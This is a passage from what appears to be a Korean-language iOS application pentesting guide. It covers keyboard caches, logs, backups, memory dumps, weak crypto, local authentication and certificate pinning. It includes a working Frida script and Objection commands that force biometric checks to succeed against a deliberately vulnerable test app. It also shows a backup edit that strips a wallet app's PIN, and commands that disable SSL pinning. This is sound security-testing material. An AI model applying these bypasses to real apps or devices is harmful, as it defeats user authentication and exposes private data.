[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
저장된 자격 증명을 추출하기 위해 Objection의 명령 `ios nsurlcredentialstorage dump`을 사용한다.

## **Custom Keyboards and Keyboard Cache**

iOS 8.0 이후로 사용자는 커스텀 키보드 확장(custom keyboard extensions)을 설치할 수 있으며, 이는 **Settings > General > Keyboard > Keyboards**에서 관리할 수 있다. 이러한 키보드는 확장된 기능을 제공하지만 keystroke logging 및 외부 서버로의 데이터 전송 위험을 초래할 수 있다. 네트워크 접근을 요구하는 키보드에 대해서는 사용자에게 알림이 표시된다. 앱은 민감한 정보 입력에 대해 커스텀 키보드의 사용을 제한할 수 있고, 제한해야 한다.

**Security Recommendations:**

- 향상된 보안을 위해 서드파티 키보드를 비활성화하는 것이 권장된다.
- 기본 iOS 키보드의 autocorrect 및 auto-suggestions 기능이 민감한 정보를 `Library/Keyboard/{locale}-dynamic-text.dat` 또는 `/private/var/mobile/Library/Keyboard/dynamic-text.dat`에 위치한 캐시 파일에 저장할 수 있으므로 주의해야 한다. 이러한 캐시 파일은 정기적으로 민감한 데이터가 있는지 확인해야 한다. 캐시된 데이터를 지우려면 **Settings > General > Reset > Reset Keyboard Dictionary**에서 키보드 사전을 재설정하는 것이 권장된다.
- 네트워크 트래픽을 가로채면 커스텀 키보드가 keystrokes를 원격으로 전송하는지 여부를 확인할 수 있다.

### **Preventing Text Field Caching**

The [UITextInputTraits protocol](https://developer.apple.com/reference/uikit/uitextinputtraits) offers properties to manage autocorrection and secure text entry, essential for preventing sensitive information caching. For example, disabling autocorrection and enabling secure text entry can be achieved with:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
또한 개발자는 텍스트 필드, 특히 비밀번호나 PIN과 같은 민감한 정보를 입력하는 필드가 캐싱을 비활성화하도록 `autocorrectionType`을 `UITextAutocorrectionTypeNo`로, `secureTextEntry`를 `YES`로 설정해야 합니다.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **로그**

코드 디버깅은 종종 **logging**을 사용한다. 로그에는 민감한 정보가 포함될 수 있으므로 위험이 있다. 과거(iOS 6 및 이전 버전)에는 로그가 모든 앱에서 접근 가능했기 때문에 민감한 데이터 유출 위험이 있었다. **이제 애플리케이션은 자신들의 로그만 접근하도록 제한되어 있다.**

이러한 제한에도 불구하고, 잠금이 해제된 기기에 물리적으로 접근할 수 있는 **공격자**는 기기를 컴퓨터에 연결해 **로그를 읽음**으로써 이를 악용할 수 있다. 앱을 삭제한 후에도 로그가 디스크에 남아 있다는 점을 유의해야 한다.

위험을 완화하기 위해서는 앱의 모든 기능과 입력을 충분히 사용해 상호작용하며 무심코 민감한 정보가 로그에 기록되지 않는지 확인하는 것이 권장된다.

앱 소스 코드를 잠재적 유출을 위해 검토할 때는 내장 함수 관련 키워드인 `NSLog`, `NSAssert`, `NSCAssert`, `fprintf`와 커스텀 구현 관련 `Logging` 또는 `Logfile`에 대한 언급을 포함해, **predefined** 및 **custom logging statements** 모두를 찾아보라.

### **시스템 로그 모니터링**

앱은 민감할 수 있는 다양한 정보를 로그한다. 이러한 로그를 모니터링하기 위해 다음과 같은 도구와 명령을 사용한다:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
유용합니다. 또한, **Xcode**는 콘솔 로그를 수집할 수 있는 방법을 제공합니다:

1. Xcode를 엽니다.
2. iOS 기기를 연결합니다.
3. 메뉴에서 **Window** -> **Devices and Simulators**로 이동합니다.
4. 기기를 선택합니다.
5. 조사 중인 문제를 재현합니다.
6. **Open Console** 버튼을 사용해 새 창에서 로그를 확인합니다.

더 고급 로깅을 위해, 기기 쉘에 연결하고 **socat**을 사용하면 실시간 로그 모니터링이 가능합니다:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
로그 활동을 관찰하기 위한 명령들이 이어지며, 이는 문제 진단이나 로그에서의 잠재적 data leakage 식별에 매우 유용할 수 있습니다.

## 백업

**자동 백업 기능**은 iOS에 통합되어 있으며, iTunes (up to macOS Catalina), Finder (from macOS Catalina onward), 또는 iCloud를 통해 기기 데이터의 복사본을 생성할 수 있게 해줍니다. 이러한 백업은 Apple Pay 정보나 Touch ID 설정과 같은 고도로 민감한 요소를 제외한 거의 모든 기기 데이터를 포함합니다.

### 보안 위험

백업에 **설치된 앱과 해당 데이터**가 포함되면 잠재적 **data leakage** 문제와 **백업 수정으로 인해 앱 기능이 변경될 위험**이 발생합니다. 이러한 위험을 완화하기 위해 어떤 앱의 디렉터리나 그 하위 디렉터리에 민감한 정보를 **평문으로 저장하지 않는 것**이 권장됩니다.

### 백업에서 파일 제외

`Documents/` 및 `Library/Application Support/`의 파일은 기본적으로 백업됩니다. 개발자는 `NSURL setResourceValue:forKey:error:`와 `NSURLIsExcludedFromBackupKey`를 사용해 백업에서 특정 파일이나 디렉터리를 제외할 수 있습니다. 이 방법은 민감한 데이터가 백업에 포함되는 것을 방지하는 데 매우 중요합니다.

### 취약점 테스트

앱의 백업 보안을 평가하려면 먼저 Finder를 사용해 **백업을 생성**한 다음, [Apple's official documentation](https://support.apple.com/en-us/HT204215)의 안내에 따라 백업 위치를 찾으십시오. 앱 동작에 영향을 줄 수 있도록 변경할 수 있는 민감한 데이터나 설정이 있는지 백업을 분석합니다.

민감한 정보는 명령줄 도구나 [iMazing](https://imazing.com)과 같은 애플리케이션을 사용해 찾아낼 수 있습니다. 암호화된 백업의 경우 백업 루트의 "Manifest.plist" 파일에서 "IsEncrypted" 키를 확인하여 암호화 여부를 확인할 수 있습니다.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
For dealing with encrypted backups, Python scripts available in [DinoSec's GitHub repo](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), like **backup_tool.py** and **backup_passwd.py**, may be useful, albeit potentially requiring adjustments for compatibility with the latest iTunes/Finder versions. The [**iOSbackup** tool](https://pypi.org/project/iOSbackup/) is another option for accessing files within password-protected backups.

### Modifying App Behavior

An example of altering app behavior through backup modifications is demonstrated in the [Bither bitcoin wallet app](https://github.com/bither/bither-ios), where the UI lock PIN is stored within `net.bither.plist` under the **pin_code** key. Removing this key from the plist and restoring the backup removes the PIN requirement, providing unrestricted access.

## Summary on Memory Testing for Sensitive Data

애플리케이션의 메모리에 저장된 민감한 정보를 다룰 때는 해당 데이터의 노출 시간을 최소화하는 것이 중요합니다. 메모리 내용을 조사하는 주요 접근법은 두 가지로, **메모리 덤프 생성**과 **메모리 실시간 분석**입니다. 두 방법 모두 덤프 과정이나 분석 중에 중요한 데이터를 놓칠 가능성 등 난관이 있습니다.

## **Retrieving and Analyzing a Memory Dump**

For both jailbroken and non-jailbroken devices, tools like [objection](https://github.com/sensepost/objection) and [Fridump](https://github.com/Nightbringer21/fridump) allow for the dumping of an app's process memory. Once dumped, analyzing this data requires various tools, depending on the nature of the information you're searching for.

메모리 덤프에서 문자열을 추출하려면 `strings` 또는 `rabin2 -zz` 같은 명령을 사용할 수 있습니다:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
특정 데이터 유형이나 패턴을 검색하는 것을 포함한 보다 자세한 분석을 위해, **radare2**는 광범위한 검색 기능을 제공합니다:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **런타임 메모리 분석**

**r2frida**는 memory dump 없이 앱의 메모리를 실시간으로 검사할 수 있는 강력한 대안을 제공합니다. 이 도구는 실행 중인 애플리케이션의 메모리에서 직접 검색 명령을 실행할 수 있게 해줍니다:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## 취약한 암호화

### 부적절한 키 관리 프로세스

일부 개발자는 민감한 데이터를 로컬 스토리지에 저장하고 코드에 hardcoded/predictable한 키로 암호화합니다. 이렇게 해서는 안 되며, 리버싱으로 공격자가 기밀 정보를 추출할 수 있습니다.

### 보안에 취약하거나/또는 deprecated된 알고리즘의 사용

개발자는 권한 부여를 수행하기 위해 **deprecated algorithms**을 사용하거나, 데이터를 **store** 또는 **send**해서는 안 됩니다. 이러한 알고리즘으로는 RC4, MD4, MD5, SHA1 등이 있습니다. 예를 들어 비밀번호를 저장하기 위해 **hashes**를 사용하는 경우, salt와 함께 brute-force에 **resistant**한 **hashes**를 사용해야 합니다.

### 점검

주요 점검 항목은 코드에서 **hardcoded** 비밀번호/비밀값을 찾을 수 있는지, 또는 이것들이 **predictable**한지, 코드가 어떤 종류의 **weak** **cryptography** 알고리즘을 사용하고 있는지 여부를 확인하는 것입니다.

다음과 같이 **objection**을 사용하여 일부 **crypto** **libraries**를 자동으로 **monitor**할 수 있다는 점도 유용합니다:
```swift
ios monitor crypt
```
iOS 암호화 API 및 라이브러리에 대한 **자세한 정보**는 다음을 참조하세요: [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Local Authentication

**로컬 인증**은 특히 암호화 방법을 통해 원격 엔드포인트의 접근을 보호할 때 중요한 역할을 합니다. 핵심은 올바르게 구현되지 않으면 로컬 인증 메커니즘이 우회될 수 있다는 점입니다.

Apple의 [**Local Authentication framework**](https://developer.apple.com/documentation/localauthentication)와 [**keychain**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)는 각각 사용자 인증 대화상자를 제공하고 비밀 데이터를 안전하게 처리하기 위한 강력한 API를 제공합니다. Secure Enclave는 Touch ID의 지문 ID를 보호하고, Face ID는 생체 데이터를 노출하지 않는 얼굴 인식을 사용합니다.

Touch ID/Face ID를 통합하려면 개발자는 두 가지 API 옵션 중에서 선택할 수 있습니다:

- `LocalAuthentication.framework`: 생체 데이터에 접근하지 않는 고수준 사용자 인증용.
- `Security.framework`: 저수준의 keychain 서비스에 접근하여 비밀 데이터를 생체 인증으로 보호. 여러 [오픈소스 래퍼](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id)가 keychain 접근을 더 쉽게 만들어 줍니다.

> [!CAUTION]
> 그러나 `LocalAuthentication.framework`와 `Security.framework`는 취약점을 가질 수 있습니다. 이들 프레임워크는 주로 인증 과정에서 데이터를 전달하지 않고 boolean 값만 반환하므로 우회될 수 있습니다 (자세한 내용은 [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM) 참조).

### Local Authentication 구현

사용자에게 인증을 요청하려면 개발자는 **`LAContext`** 클래스의 **`evaluatePolicy`** 메서드를 사용해야 하며, 다음 옵션 중 하나를 선택합니다:

- `deviceOwnerAuthentication`: Touch ID 또는 기기 패스코드를 요청하며, 둘 다 활성화되어 있지 않으면 실패합니다.
- `deviceOwnerAuthenticationWithBiometrics`: Touch ID 전용으로 요청합니다.

성공적인 인증은 **`evaluatePolicy`**의 boolean 반환값으로 표시되며, 이는 잠재적 보안 결함을 드러냅니다.

### Keychain을 이용한 Local Authentication

iOS 앱에서 **로컬 인증**을 구현할 때는 인증 토큰 같은 비밀 데이터를 안전하게 저장하기 위해 **keychain APIs**를 사용합니다. 이 과정은 해당 데이터가 기기 패스코드 또는 Touch ID와 같은 생체 인증을 통해서만 사용자가 접근할 수 있도록 보장합니다.

keychain은 `SecAccessControl` 속성으로 항목을 설정할 수 있는 기능을 제공하며, 사용자가 Touch ID 또는 기기 패스코드로 성공적으로 인증할 때까지 항목에 대한 접근을 제한합니다. 이 기능은 보안을 강화하는 데 매우 중요합니다.

아래에는 Swift 및 Objective-C 코드 예제가 있으며, 이러한 보안 기능을 활용해 문자열을 keychain에 저장하고 불러오는 방법을 보여줍니다. 예제는 특히 Touch ID 인증을 요구하도록 접근 제어를 설정하고, 기기 패스코드가 설정된 경우에만 해당 데이터를 설정된 기기에서만 접근 가능하도록 하는 방법을 보여줍니다.

{{#tabs}}
{{#tab name="Swift"}}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{{#endtab}}

{{#tab name="Objective-C"}}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{{#endtab}}
{{#endtabs}}

이제 keychain에 저장된 항목을 요청할 수 있습니다. Keychain services는 사용자에게 인증 대화상자를 표시하고, 적절한 지문(fingerprint)이 제공되었는지에 따라 data 또는 nil을 반환합니다.

{{#tabs}}
{{#tab name="Swift"}}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{{#endtab}}

{{#tab name="Objective-C"}}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{{#endtab}}
{{#endtabs}}

### 탐지

앱에서 프레임워크의 사용은 앱 바이너리의 공유 동적 라이브러리 목록을 분석하여 확인할 수 있습니다. 이는 `otool`을 사용하여 수행할 수 있습니다:
```bash
$ otool -L <AppName>.app/<AppName>
```
앱에서 `LocalAuthentication.framework`가 사용되는 경우, 출력에는 다음 두 줄이 모두 포함됩니다(참고: `LocalAuthentication.framework`는 내부적으로 `Security.framework`를 사용합니다):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
`Security.framework`가 사용되는 경우 두 번째 항목만 표시됩니다.

### 로컬 인증 프레임워크 우회

#### **Objection**

**Objection Biometrics Bypass**는 [this GitHub page](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass)에 위치해 있으며 **LocalAuthentication** 메커니즘을 우회하기 위한 기법을 제공합니다. 이 접근법의 핵심은 **Frida**를 이용해 `evaluatePolicy` 함수를 조작하여 실제 인증 성공 여부와 관계없이 항상 `True` 결과를 반환하도록 만드는 것입니다. 이는 결함이 있는 생체 인증 프로세스를 우회하는 데 특히 유용합니다.

이 우회를 활성화하려면 다음 명령을 사용합니다:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
이 명령은 Objection이 작업을 등록하여 `evaluatePolicy` 체크의 결과를 `True`로 실질적으로 변경하는 일련의 과정을 촉발합니다.

#### Frida

다음은 [DVIA-v2 application](https://github.com/prateek147/DVIA-v2)에서 **`evaluatePolicy`**를 사용한 예입니다:
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Local Authentication의 **bypass**를 달성하기 위해 Frida 스크립트를 작성합니다. 이 스크립트는 **evaluatePolicy** 체크를 대상으로 하며, 그 callback을 가로채 **success=1**을 반환하도록 보장합니다. callback의 동작을 변경함으로써 인증 검사는 사실상 **bypass**됩니다.

아래 스크립트는 **evaluatePolicy** 메서드의 결과를 수정하기 위해 주입됩니다. 이 스크립트는 callback의 결과를 항상 성공을 나타내도록 변경합니다.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Frida 스크립트를 주입하고 생체 인증을 우회하려면 다음 명령을 사용합니다:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## IPC를 통한 민감 기능 노출

### 커스텀 URI 핸들러 / Deeplinks / 커스텀 스킴


{{#ref}}
ios-custom-uri-handlers-deeplinks-custom-schemes.md
{{#endref}}

### Universal Links


{{#ref}}
ios-universal-links.md
{{#endref}}

### UIActivity Sharing


{{#ref}}
ios-uiactivity-sharing.md
{{#endref}}

### UIPasteboard


{{#ref}}
ios-uipasteboard.md
{{#endref}}

### App Extensions


{{#ref}}
ios-app-extensions.md
{{#endref}}

### WebViews


{{#ref}}
ios-webviews.md
{{#endref}}

### Serialisation and Encoding


{{#ref}}
ios-serialisation-and-encoding.md
{{#endref}}

## 네트워크 통신

통신이 **암호화되지 않은 상태로** 이루어지지 않는지, 또한 애플리케이션이 서버의 **TLS 인증서**를 올바르게 **검증**하고 있는지 확인하는 것이 중요합니다.\
이러한 문제를 확인하려면 **Burp**와 같은 프록시를 사용할 수 있습니다:


{{#ref}}
burp-configuration-for-ios.md
{{#endref}}

### Hostname check

TLS 인증서를 검증할 때 흔한 문제 중 하나는 인증서가 **신뢰된** **CA**에 의해 서명되었는지만 확인하고, 인증서의 **호스트네임**이 실제 접속하려는 호스트네임인지 **확인하지 않는 것**입니다.\
Burp를 사용해 이 문제를 확인하려면, iPhone에서 Burp CA를 신뢰한 뒤 **Burp로 다른 호스트네임에 대한 새 인증서를 생성**하여 사용하면 됩니다. 애플리케이션이 여전히 작동한다면 취약한 상태입니다.

### Certificate Pinning

애플리케이션이 SSL Pinning을 올바르게 사용하고 있다면, 애플리케이션은 기대한 인증서가 있는 경우에만 작동합니다. 테스트 시에는 **Burp가 자체 인증서를 제공하기 때문에 문제가 될 수 있습니다.**\
이 보호를 우회하려면 탈옥된 기기에서 [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2)를 설치하거나 [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)를 설치할 수 있습니다.

또한 **objection**의 `ios sslpinning disable`을 사용할 수 있습니다

## 기타

- **`/System/Library`**에는 시스템 애플리케이션에서 사용하는 프레임워크가 설치되어 있습니다
- App Store에서 사용자가 설치한 애플리케이션은 **`/User/Applications`**에 위치합니다
- **`/User/Library`**는 사용자 레벨 애플리케이션이 저장한 데이터를 포함합니다
- 애플리케이션에 저장된 노트를 읽기 위해 **`/User/Library/Notes/notes.sqlite`**에 접근할 수 있습니다.
- 설치된 애플리케이션의 폴더(**`/User/Applications/<APP ID>/`**) 안에서 몇몇 흥미로운 파일을 찾을 수 있습니다:
  - **`iTunesArtwork`**: 앱에서 사용되는 아이콘
  - **`iTunesMetadata.plist`**: App Store에서 사용되는 앱 정보
  - **`/Library/*`**: 환경설정과 캐시를 포함합니다. **`/Library/Cache/Snapshots/*`**에는 애플리케이션을 백그라운드로 보내기 전에 수행된 스냅샷을 찾을 수 있습니다.

### Hot Patching/강제 업데이트

개발자는 애플리케이션을 App Store에 재제출하고 승인될 때까지 기다리지 않고 원격으로 애플리케이션의 모든 설치본을 즉시 **패치할 수 있습니다**.\
이를 위해 일반적으로 [**JSPatch**](https://github.com/bang590/JSPatch)를 사용합니다. 그러나 [Siren](https://github.com/ArtSabintsev/Siren)과 [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker) 같은 다른 옵션도 있습니다.\
**이 메커니즘은 악성 서드파티 SDK에 의해 악용될 수 있는 위험한 기능이므로, 자동 업데이트에 어떤 방법이 사용되는지(있는 경우) 확인하고 테스트하는 것이 권장됩니다.** 이 목적을 위해 앱의 이전 버전을 다운로드해 볼 수 있습니다.

### Third Parties

**3rd party SDKs**의 중요한 문제는 그 기능에 대한 **세분화된 제어의 부재**입니다. 개발자는 SDK를 통합해 그 모든 기능(잠재적 보안 취약점 및 프라이버시 문제 포함)을 수용하거나, 그 이점을 포기하는 선택을 해야 합니다. 종종 개발자는 SDK 내부의 취약점을 직접 패치할 수 없습니다. 게다가 SDK가 커뮤니티에서 신뢰를 얻으면 일부는 악성코드를 포함하게 될 수도 있습니다.

서드파티 SDK가 제공하는 서비스에는 사용자 행동 추적, 광고 표시, 사용자 경험 향상 등이 포함될 수 있습니다. 그러나 이는 개발자가 해당 라이브러리에서 실행되는 코드를 완전히 파악하지 못할 위험을 초래하여 프라이버시 및 보안 문제로 이어질 수 있습니다. 서드파티 서비스와 공유하는 정보는 필요한 것에 한정하고 민감한 데이터가 노출되지 않도록 하는 것이 중요합니다.

서드파티 서비스의 구현은 일반적으로 독립 라이브러리 형태나 전체 SDK 형태로 제공됩니다. 사용자 프라이버시를 보호하기 위해 이러한 서비스와 공유되는 모든 데이터는 개인 식별 정보(PII)가 노출되지 않도록 **익명화**되어야 합니다.

애플리케이션이 사용하는 라이브러리를 식별하려면 **`otool`** 명령을 사용할 수 있습니다. 이 도구는 애플리케이션과 애플리케이션이 사용하는 각 공유 라이브러리에 대해 실행하여 추가로 사용되는 라이브러리를 발견할 수 있습니다.
```bash
otool -L <application_path>
```
## 흥미로운 취약점 및 사례 연구


{{#ref}}
air-keyboard-remote-input-injection.md
{{#endref}}

{{#ref}}
itunesstored-bookassetd-sandbox-escape.md
{{#endref}}

## **참고자료 및 추가 리소스**

- [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
- [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
- [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
- [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
- [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
- [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
- [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) iOS 무료 강좌([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
- [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
- [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
- [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
- [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
- [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
- OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C 버전 [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift 버전
- [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
- [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)


{{#include ../../banners/hacktricks-training.md}}
